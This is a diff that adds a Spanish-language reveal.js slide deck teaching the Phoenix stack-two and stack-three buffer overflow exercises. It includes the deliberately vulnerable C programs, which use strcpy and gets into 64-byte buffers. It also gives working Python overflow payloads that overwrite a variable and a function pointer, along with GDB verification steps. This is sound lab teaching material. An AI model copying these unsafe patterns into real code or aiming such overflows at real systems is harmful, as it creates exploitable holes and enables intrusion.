@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<title>Stack Two &amp; Three</title>
+<meta name="author" content="Rising Edge - Enrique"/>
+<meta name="description" content=""/>
+<meta name="keywords" content=""/>
+<style type="text/css">
+.underline { text-decoration: underline; }
+</style>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js/dist/reveal.css"/>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js/dist/theme/dracula.css" id="theme"/>
+
+
+<!-- If the query includes 'print-pdf', include the PDF print sheet -->
+<script>
+    if( window.location.search.match( /print-pdf/gi ) ) {
+        var link = document.createElement( 'link' );
+        link.rel = 'stylesheet';
+        link.type = 'text/css';
+        link.href = 'https://cdn.jsdelivr.net/npm/reveal.js/css/print/pdf.css';
+        document.getElementsByTagName( 'head' )[0].appendChild( link );
+    }
+</script>
+</head>
+<body>
+<div class="reveal">
+<div class="slides">
+<section id="sec-title-slide"><h1 class="title">Stack Two &amp; Three</h1><p class="subtitle">Variables de entorno y apuntadores a funciones</p>
+<h2 class="author">Rising Edge - Enrique</h2><h2 class="date">2026-06-03</h2>
+</section>
+<section id="sec-table-of-contents"><div id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#/slide-orga5db610">Recapitulación</a></li>
+<li><a href="#/slide-orgea04014">Ejercicio stack-two</a></li>
+<li><a href="#/slide-orgb8402ab">Ejercicio stack-three</a></li>
+<li><a href="#/slide-orgb60569a">Gracias (:</a></li>
+</ul>
+</div>
+</div>
+</section>
+
+<section>
+<section id="slide-orga5db610">
+<h2 id="orga5db610">Recapitulación</h2>
+<ul>
+<li>Argumentos (<code>argc</code> y <code>argv</code>)</li>
+<li>Endianness (LSB y MSB)</li>
+<li>Prólogo y epílogo de una función</li>
+<li>Resuelto stack 0 y 1</li>
+
+</ul>
+</section>
+</section>
+<section>
+<section id="slide-orgea04014">
+<h2 id="orgea04014">Ejercicio stack-two</h2>
+<div class="outline-text-2" id="text-orgea04014">
+</div>
+</section>
+<section id="slide-org84e4f4d">
+<h3 id="org84e4f4d">Código</h3>
+<div class="org-src-container">
+
+<pre  class="src src-c"   ><code trim><span style="color: #b8a6a9;">/*</span><span style="color: #b8a6a9;">
+ * phoenix/stack-two, by https://exploit.education
+ *
+ * The aim is to change the contents of the changeme variable to 0x0d0a090a
+</span><span style="color: #b8a6a9;"> */</span>
+
+<span style="color: #7fbbb3; font-weight: bold;">#include</span> <span style="color: #a7c080;">&lt;err.h&gt;</span>
+<span style="color: #7fbbb3; font-weight: bold;">#include</span> <span style="color: #a7c080;">&lt;stdio.h&gt;</span>
+<span style="color: #7fbbb3; font-weight: bold;">#include</span> <span style="color: #a7c080;">&lt;stdlib.h&gt;</span>
+<span style="color: #7fbbb3; font-weight: bold;">#include</span> <span style="color: #a7c080;">&lt;string.h&gt;</span>
+<span style="color: #7fbbb3; font-weight: bold;">#include</span> <span style="color: #a7c080;">&lt;unistd.h&gt;</span>
+
+<span style="color: #7fbbb3; font-weight: bold;">#define</span> <span style="color: #7fbbb3;">BANNER</span> \
+  <span style="color: #a7c080;">"Welcome to "</span> LEVELNAME <span style="color: #a7c080;">", brought to you by https://exploit.education"</span>
+
+<span style="color: #e69875;">int</span> <span style="color: #83c092;">main</span>(<span style="color: #e69875;">int</span> <span style="color: #7fbbb3;">argc</span>, <span style="color: #e69875;">char</span> **<span style="color: #7fbbb3;">argv</span>) {
+  <span style="color: #8fc69c;">struct</span> {
+    <span style="color: #e69875;">char</span> <span style="color: #7fbbb3;">buffer</span>[64];
+    <span style="color: #8fc69c;">volatile</span> <span style="color: #e69875;">int</span> <span style="color: #7fbbb3;">changeme</span>;
+  } <span style="color: #7fbbb3;">locals</span>;
+
+  <span style="color: #e69875;">char</span> *<span style="color: #7fbbb3;">ptr</span>;
+
+  printf(<span style="color: #a7c080;">"%s\n"</span>, BANNER);
+
+  ptr = getenv(<span style="color: #a7c080;">"ExploitEducation"</span>);
+  <span style="color: #8fc69c;">if</span> (ptr == <span style="color: #d699b6;">NULL</span>) {
+    errx(1, <span style="color: #a7c080;">"please set the ExploitEducation environment variable"</span>);
+  }
+
+  locals.changeme = 0;
+  strcpy(locals.buffer, ptr);
+
+  <span style="color: #8fc69c;">if</span> (locals.changeme == 0x0d0a090a) {
+    puts(<span style="color: #a7c080;">"Well done, you have successfully set changeme to the correct value"</span>);
+  } <span style="color: #8fc69c;">else</span> {
+    printf(<span style="color: #a7c080;">"Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n"</span>,
+        locals.changeme);
+  }
+
+  exit(0);
+}
+</code></pre>
+</div>
+</section>
+<section id="slide-org92314a4">
+<h3 id="org92314a4">Resumiendo el código&hellip;</h3>
+<div class="org-src-container">
+
+<pre  class="src src-text"   ><code trim>struct {
+  char buffer[64];
+  volatile int changeme;
+} locals;
+
+apuntador = variable_de_entorno("ExploitEducation")
+
+si apuntador es NULO
+  error()
+
+locals.changeme = 0
+strcpy(locals.buffer, ptr)
+
+si locals.changeme == 0x0d0a090a:
+    imprime "bien"
+en otro caso:
+    imprime "ya casi, valor..."
+</code></pre>
+</div>
+</section>
+<section id="slide-orgbccfdf1">
+<h3 id="orgbccfdf1">Objetivo</h3>
+<ul>
+<li class="fragment appear">Cambiar el valor de <code>locals.changeme</code> a <code>0x0d0a090a</code>.</li>
+<li class="fragment appear">¿En dónde haremos el desbordamiento ahora?</li>
+
+</ul>
+</section>
+<section id="slide-org4ec1b11">
+<h3 id="org4ec1b11">Teoría</h3>
+<div class="outline-text-3" id="text-org4ec1b11">
+</div>
+</section>
+<section id="slide-org3cef84c">
+<h4 id="org3cef84c">Variables de entorno</h4>
+<ul>
+<li class="fragment appear"><a href="https://en.wikipedia.org/wiki/Environment_variable">Significado</a></li>
+<li class="fragment appear">Variable definida por usuario.</li>
+<li class="fragment appear">Afecta la ejecución y el comportamiento de procesos en una computadora.</li>
+<li class="fragment appear">Parte del entorno de ejecución de un proceso.</li>
+<li class="fragment appear">Ejemplos: <code>$PATH $HOME $PS1 $EDITOR $TEMP</code>&hellip;</li>
+<li class="fragment appear">¿Qué hace <code>export PS1='hola: '</code>?</li>
+<li class="fragment appear">¿Qué hace <code>export PS1='($?) \u en \h: '</code>?</li>
+<li class="fragment appear"><code>export</code> configura una variable de entorno para procesos hijos.</li>
+
+</ul>
+</section>
+<section id="slide-orgda42590">
+<h4 id="orgda42590">Asignando una variable de entorno temporalmente a un proceso</h4>
+<div class="org-src-container">
+
+<pre  class="src src-bash"   ><code trim><span style="color: #7fbbb3;">ENVVAR_TEMP</span>=<span style="color: #a7c080;">'hola'</span> comando
+</code></pre>
+</div>
+</section>
+<section id="slide-org0ae9030">
+<h4 id="org0ae9030">Caracteres no imprimibles</h4>
+<ul>
+<li>¿Qué caracteres corresponden a estos hexadecimales en ASCII?</li>
+
+</ul>
+<ul>
+<li class="fragment appear">0x0d</li>
+<li class="fragment appear">0x0a</li>
+<li class="fragment appear">0x09</li>
+<li class="fragment appear">0x0a</li>
+
+</ul>
+</section>
+<section id="slide-org54cda62">
+<h4 id="org54cda62">¿Cómo imprimimos estos caracteres?</h4>
+<ul>
+<li><a href="https://stackoverflow.com/a/40092462">How to write a raw hex byte to stdout in Python 3?</a></li>
+
+</ul>
+
+<div class="org-src-container">
+
+<pre  class="src src-bash"   ><code trim>python3 -c <span style="color: #a7c080;">'import sys; sys.stdout.buffer.write(b"\x48\x6f\x6c\x61\x0a\xf0\x9f\x8c\x8a\x0a")'</span>
+<span style="color: #b8a6a9;">#                   </span><span style="color: #b8a6a9;">^                           ^             ^^
+</span><span style="color: #b8a6a9;">#                </span><span style="color: #b8a6a9;">modulo                   objeto bytes     separador</span>
+</code></pre>
+</div>
+</section>
+<section id="slide-orgbc3ae11">
+<h4 id="orgbc3ae11">Sustitución de comandos (command substitution)</h4>
+<ul>
+<li>Permite asignar la salida de un comando como valor a una variable de la shell.</li>
+<li>Sintaxis y ejemplo:</li>
+
+</ul>
+
+<div class="org-src-container">
+
+<pre  class="src src-text"   ><code trim>$(COMANDO)
+</code></pre>
+</div>
+
+<div class="org-src-container">
+
+<pre  class="src src-bash"   ><code trim><span style="color: #7fbbb3;">MI_DISTRO</span>=$(<span style="color: #7fbbb3; font-weight: bold;">grep "^NAME" /etc/os-release | cut -d \" -f 2</span>)
+<span style="color: #e69875;">echo</span> $<span style="color: #7fbbb3;">MI_DISTRO</span>
+</code></pre>
+</div>
+</section>
+<section id="slide-org84b281f">
+<h3 id="org84b281f">Resolviendo stack-two&hellip;</h3>
+<p>
+Asignamos una variable de entorno temporal igual a 64 caracteres y el valor que
+pide el nivel.
+</p>
+
+<div class="org-src-container">
+
+<pre  class="src src-bash"   ><code trim><span style="color: #7fbbb3;">ExploitEducation</span>=$(<span style="color: #7fbbb3; font-weight: bold;">python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x0a\x09\x0a\x0d"</span><span style="color: #a7c080;">)'</span>) /opt/phoenix/amd64/stack-two
+</code></pre>
+</div>
+</section>
+<section id="slide-orgda9b11a">
+<h3 id="orgda9b11a">Verificación stack-two</h3>
+<div class="outline-text-3" id="text-orgda9b11a">
+</div>
+</section>
+<section id="slide-orgf65aee1">
+<h4 id="orgf65aee1">Análisis de archivo</h4>
+<div class="org-src-container">
+
+<pre  class="src src-bash" id="file-stack-one"  ><code trim>file /opt/phoenix/amd64/stack-two
+</code></pre>
+</div>
+
+<div class="org-src-container">
+
+<pre  class="src src-text"   ><code trim>/opt/phoenix/amd64/stack-two: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped
+</code></pre>
+</div>
+
+<ul>
+<li>Usa Little-Endian pues es un LSB executable</li>
+
+</ul>
+</section>
+<section id="slide-orgffb97ac">
+<h4 id="orgffb97ac">Medidas de protección</h4>
+<div class="org-src-container">
+
+<pre  class="src src-bash" id="checksec-stack-one"  ><code trim>checksec /opt/phoenix/amd64/stack-two
+</code></pre>
+</div>
+
+<div class="org-src-container">
+
+<pre  class="src src-text"   ><code trim>[*] '/opt/phoenix/amd64/stack-two'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+    RPATH:    '/opt/phoenix/x86_64-linux-musl/lib'
+</code></pre>
+</div>
+
+<ul>
+<li>Sin medidas de protección (:</li>
+
+</ul>
+</section>
+<section id="slide-orgaa69ab9">
+<h4 id="orgaa69ab9">Ejecutar GDB</h4>
+<div class="org-src-container">
+
+<pre  class="src src-bash"   ><code trim><span style="color: #d699b6;">export</span> <span style="color: #7fbbb3;">ExploitEducation</span>=$(<span style="color: #7fbbb3; font-weight: bold;">python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x0a\x09\x0a\x0d"</span><span style="color: #a7c080;">)'</span>)
+gdb -q /opt/phoenix/amd64/stack-two
+</code></pre>
+</div>
+</section>
+<section id="slide-org3c14073">
+<h4 id="org3c14073">Proceso de verificación</h4>
+<div class="org-src-container">
+
+<pre  class="src src-GDB"   ><code trim>disassemble main
+break *0x0400701
+break *0x0400709
+define hook-stop
+info registers
+x/28wx $rsp
+x/3i $rip
+end
+gef config context.enable 0
+run
+continue
+x/wx $rbp-0x10
+continue
+quit
+</code></pre>
+</div>
+</section>
+</section>
+<section>
+<section id="slide-orgb8402ab">
+<h2 id="orgb8402ab">Ejercicio stack-three</h2>
+<div class="outline-text-2" id="text-orgb8402ab">
+</div>
+</section>
+<section id="slide-orgd14a7fa">
+<h3 id="orgd14a7fa">Código</h3>
+<div class="org-src-container">
+
+<pre  class="src src-c"   ><code trim><span style="color: #b8a6a9;">/*</span><span style="color: #b8a6a9;">
+ * phoenix/stack-three, by https://exploit.education
+ *
+ * The aim is to change the contents of the changeme variable to 0x0d0a090a
+</span><span style="color: #b8a6a9;"> */</span>
+
+<span style="color: #7fbbb3; font-weight: bold;">#include</span> <span style="color: #a7c080;">&lt;err.h&gt;</span>
+<span style="color: #7fbbb3; font-weight: bold;">#include</span> <span style="color: #a7c080;">&lt;stdio.h&gt;</span>
+<span style="color: #7fbbb3; font-weight: bold;">#include</span> <span style="color: #a7c080;">&lt;stdlib.h&gt;</span>
+<span style="color: #7fbbb3; font-weight: bold;">#include</span> <span style="color: #a7c080;">&lt;string.h&gt;</span>
+<span style="color: #7fbbb3; font-weight: bold;">#include</span> <span style="color: #a7c080;">&lt;unistd.h&gt;</span>
+
+<span style="color: #7fbbb3; font-weight: bold;">#define</span> <span style="color: #7fbbb3;">BANNER</span> \
+  <span style="color: #a7c080;">"Welcome to "</span> LEVELNAME <span style="color: #a7c080;">", brought to you by https://exploit.education"</span>
+
+<span style="color: #e69875;">char</span> *<span style="color: #83c092;">gets</span>(<span style="color: #e69875;">char</span> *);
+
+<span style="color: #e69875;">void</span> <span style="color: #83c092;">complete_level</span>() {
+  printf(<span style="color: #a7c080;">"Congratulations, you've finished "</span> LEVELNAME <span style="color: #a7c080;">" :-) Well done!\n"</span>);
+  exit(0);
+}
+
+<span style="color: #e69875;">int</span> <span style="color: #83c092;">main</span>(<span style="color: #e69875;">int</span> <span style="color: #7fbbb3;">argc</span>, <span style="color: #e69875;">char</span> **<span style="color: #7fbbb3;">argv</span>) {
+  <span style="color: #8fc69c;">struct</span> {
+    <span style="color: #e69875;">char</span> <span style="color: #7fbbb3;">buffer</span>[64];
+    <span style="color: #8fc69c;">volatile</span> <span style="color: #e69875;">int</span> (*<span style="color: #83c092;">fp</span>)();
+  } <span style="color: #7fbbb3;">locals</span>;
+
+  printf(<span style="color: #a7c080;">"%s\n"</span>, BANNER);
+
+  locals.fp = <span style="color: #d699b6;">NULL</span>;
+  gets(locals.buffer);
+
+  <span style="color: #8fc69c;">if</span> (locals.fp) {
+    printf(<span style="color: #a7c080;">"calling function pointer @ %p\n"</span>, locals.fp);
+    fflush(stdout);
+    locals.fp();
+  } <span style="color: #8fc69c;">else</span> {
+    printf(<span style="color: #a7c080;">"function pointer remains unmodified :~( better luck next time!\n"</span>);
+  }
+
+  exit(0);
+}
+</code></pre>
+</div>
+</section>
+<section id="slide-org7326f67">
+<h3 id="org7326f67">Resumiendo el código&hellip;</h3>
+<ul>
+<li>¿Quién puede escribir el pseudocódigo o diagrama de flujo general?</li>
+
+</ul>
+</section>
+<section id="slide-org44e5128">
+<h3 id="org44e5128">Objetivo</h3>
+<ul>
+<li>¿Cómo resolvemos el nivel?</li>
+
+</ul>
+</section>
+<section id="slide-orgcb43f79">
+<h3 id="orgcb43f79">Teoría</h3>
+<div class="outline-text-3" id="text-orgcb43f79">
+</div>
+</section>
+<section id="slide-org9c982d6">
+<h4 id="org9c982d6">Alternativa para obtener desensamblado</h4>
+<ul>
+<li><code>objdump</code> muestra información de archivos objeto.</li>
+<li>Podemos obtener el desensamblado invocando directamente.</li>
+
+</ul>
+
+<div class="org-src-container">
+
+<pre  class="src src-bash"   ><code trim>objdump -d -M intel ARCHIVO
+</code></pre>
+</div>
+</section>
+<section id="slide-org5df379d">
+<h4 id="org5df379d">Archivos objeto</h4>
+<ul>
+<li><a href="https://en.wikipedia.org/wiki/Object_file">Enlace</a>.</li>
+<li>Son aquellos que contienen código máquina o bytecode y los genera un
+compilador o ensamblador.</li>
+<li>Hasta ahora hemos usado archivos objeto <a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format">ELF</a>, aunque también existen los COFF y
+Mach-O</li>
+
+</ul>
+</section>
+<section id="slide-orga81788f">
+<h3 id="orga81788f">Resolviendo stack-three&hellip;</h3>
+<ol>
+<li>Entender código</li>
+<li>Identificar dirección de función a la que saltar</li>
+<li>Sobrescribir búfer con dirección</li>
+
+</ol>
+</section>
+<section id="slide-org3f2ca2f">
+<h4 id="org3f2ca2f">Solución</h4>
+<p>
+Obtenemos la dirección de la función <code>complete_level</code>, sobreescribimos el buffer
+y pasamos la direction encontrada.
+</p>
+
+<div class="org-src-container">
+
+<pre  class="src src-bash"   ><code trim>nm -C --defined-only /opt/phoenix/amd64/stack-three <span style="color: #b8a6a9;"># </span><span style="color: #b8a6a9;">Opci&#243;n 1
+</span>readelf -s /opt/phoenix/amd64/stack-three <span style="color: #b8a6a9;"># </span><span style="color: #b8a6a9;">Opci&#243;n 2
+</span>objdump -M intel -d /opt/phoenix/amd64/stack-three | <span style="color: #e69875;">grep</span> -A6 <span style="color: #a7c080;">"complete_level"</span> <span style="color: #b8a6a9;"># </span><span style="color: #b8a6a9;">Opci&#243;n 3
+</span>objdump -d /opt/phoenix/amd64/stack-three | awk <span style="color: #a7c080;">'/complete_level/ {print $1}'</span>
+python3 -c <span style="color: #a7c080;">'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x9d\x06\x40")'</span> | /opt/phoenix/amd64/stack-three
+</code></pre>
+</div>
+</section>
+<section id="slide-org3fdc5aa">
+<h3 id="org3fdc5aa">Verificación stack-three</h3>
+<div class="outline-text-3" id="text-org3fdc5aa">
+</div>
+</section>
+<section id="slide-orga3b4d44">
+<h4 id="orga3b4d44">Análisis de archivo</h4>
+<div class="org-src-container">
+
+<pre  class="src src-bash" id="file-stack-one"  ><code trim>file /opt/phoenix/amd64/stack-three
+</code></pre>
+</div>
+
+<div class="org-src-container">
+
+<pre  class="src src-text"   ><code trim>/opt/phoenix/amd64/stack-three: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped
+</code></pre>
+</div>
+
+<ul>
+<li>Usa Little-Endian pues es un LSB executable</li>
+
+</ul>
+</section>
+<section id="slide-org15d52e8">
+<h4 id="org15d52e8">Proceso de verificación</h4>
+<ul>
+<li>Identificar dirección donde se llama al apuntador.</li>
+<li>Colocar un breakpoint antes de esa llamada.</li>
+<li>Analizar valor del registro RIP.</li>
+
+</ul>
+</section>
+</section>
+<section>
+<section id="slide-orgb60569a">
+<h2 id="orgb60569a">Gracias (:</h2>
+<blockquote >
+<p>
+Hacker is a term for both those who write code and those who exploit it.
+</p>
+</blockquote>
+</section>
+</section>
+</div>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js/dist/reveal.js"></script>
+
+<script>
+// Full list of configuration options available here:
+// https://github.com/hakimel/reveal.js#configuration
+Reveal.initialize({
+
+// Optional libraries used to extend on reveal.js
+dependencies: [
+ { src: 'https://cdn.jsdelivr.net/npm/reveal.js/plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+ { src: 'https://cdn.jsdelivr.net/npm/reveal.js/plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+ { src: 'https://cdn.jsdelivr.net/npm/reveal.js/plugin/zoom-js/zoom.js', async: true, condition: function() { return !!document.body.classList; } },
+ { src: 'https://cdn.jsdelivr.net/npm/reveal.js/plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } }]
+
+});
+
+</script>
+</body>
+</html>
